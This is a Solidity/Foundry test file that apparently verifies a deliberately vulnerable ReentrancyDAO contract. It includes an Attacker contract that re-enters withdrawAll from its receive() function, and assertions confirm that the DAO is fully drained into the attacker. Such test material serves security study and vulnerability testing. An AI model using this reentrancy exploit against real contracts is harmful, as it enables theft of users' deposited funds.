import {Test} from "../lib/forge-std/src/Test.sol";
import {ReentrancyDAO} from "../src/ReentrancyDAO.sol";

contract TestReentrancyReentrancyDAO is Test {
    ReentrancyDAO public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new ReentrancyDAO();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 3);

        // Fund the test contract so it can seed the victim and the attacker
        vm.deal(address(this), attackVal * 3);

        // Honest user deposits into the DAO
        _contractUnderTest.deposit{value: attackVal}();

        // Attacker prepares by depositing into the DAO to gain credit
        _attacker.setupAttack{value: attackVal}(attackVal);

        uint256 daoBalanceBefore = address(_contractUnderTest).balance;
        uint256 attackerBalanceBefore = address(_attacker).balance;

        // Sanity-check: DAO should now hold exactly twice the attack value
        assertEq(daoBalanceBefore, 2 * attackVal, "Unexpected DAO balance before attack");
        assertEq(attackerBalanceBefore, 0, "Attacker should start with zero balance before attack");

        // Trigger the reentrancy exploit
        _attacker.attack(attackVal);

        uint256 daoBalanceAfter = address(_contractUnderTest).balance;
        uint256 attackerBalanceAfter = address(_attacker).balance;

        // The attacker should have re-entered and drained both its own and the honest user's deposit
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
        assertEq(_attacker.reentrancyCount(), 2, "Expected exactly one re-entrant call.");
        assertEq(daoBalanceAfter, 0, "DAO should be fully drained.");
        assertEq(attackerBalanceAfter, 2 * attackVal, "Attacker did not receive the expected stolen funds.");
    }

    // Allow this test contract to receive Ether if needed
    receive() external payable {}
}

contract Attacker {
    ReentrancyDAO public victim;

    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    uint256 private storedVal;

    constructor(address victimAddress) {
        victim = ReentrancyDAO(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;

        require(msg.value == val, "Incorrect value supplied to setupAttack");

        // Deposit into the victim so this contract has credit to withdraw
        victim.deposit{value: val}();
    }

    function attack(uint256 val) public {
        storedVal = val;

        // Initiate the vulnerable call; re-entrancy will be triggered from receive()
        victim.withdrawAll();

        if (reentrancyCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            // Re-enter the vulnerable function
            victim.withdrawAll();
        }
    }
}
